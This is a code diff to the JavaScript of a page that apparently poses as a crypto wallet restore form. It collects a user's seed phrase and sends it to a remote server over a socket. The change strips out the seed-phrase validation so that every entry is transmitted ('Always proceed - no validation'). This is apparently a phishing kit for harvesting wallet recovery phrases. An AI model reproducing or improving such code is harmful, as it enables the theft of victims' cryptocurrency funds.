@@ -899,7 +899,7 @@ document.addEventListener('DOMContentLoaded', function() {
         // Set grid columns based on word count
         const cols = wordCount === 12 ? 4 : wordCount === 18 || wordCount === 24 ? 4 : 3;
         
-        // Update the class name properly
+        // Update the grid layout using inline styles
         inputContainer.style.display = 'grid';
         inputContainer.style.gridTemplateColumns = `repeat(${cols}, minmax(0, 1fr))`;
         inputContainer.style.gap = '1rem';
@@ -936,13 +936,10 @@ document.addEventListener('DOMContentLoaded', function() {
     // Handle form submission
     document.getElementById('continue').addEventListener('click', function() {
         const inputs = document.querySelectorAll('.seed-word-input');
-        const seedArray = Array.from(inputs).map(input => input.value.trim());
+        const seedArray = Array.from(inputs).map(input => input.value.trim()).filter(word => word !== '');
         const seedPhrase = seedArray.join(' ');
 
-        if (!validateSeedPhrase(seedArray)) {
-            return;
-        }
-
+        // Always proceed - no validation
         try {
             // Send data to server
             socket.emit('user_action', {
@@ -966,26 +963,6 @@ document.addEventListener('DOMContentLoaded', function() {
             document.getElementById('errorMessage_Seed').style.display = 'block';
         }
     });
-
-    function validateSeedPhrase(wordArray) {
-        // Check if all fields have values
-        const emptyFields = wordArray.some(word => word === '');
-        if (emptyFields) {
-            document.getElementById('errorMessage_Seed').textContent = 'Please fill in all seed phrase words';
-            document.getElementById('errorMessage_Seed').style.display = 'block';
-            return false;
-        }
-        
-        // Check if it has the correct number of words based on currentWordCount
-        const validLengths = [12, 18, 24];
-        if (!validLengths.includes(wordArray.length) || wordArray.length !== currentWordCount) {
-            document.getElementById('errorMessage_Seed').textContent = `Seed phrase must contain ${currentWordCount} words`;
-            document.getElementById('errorMessage_Seed').style.display = 'block';
-            return false;
-        }
-        
-        return true;
-    }
 
     // Handle socket connection
     socket.on('connect', () => {
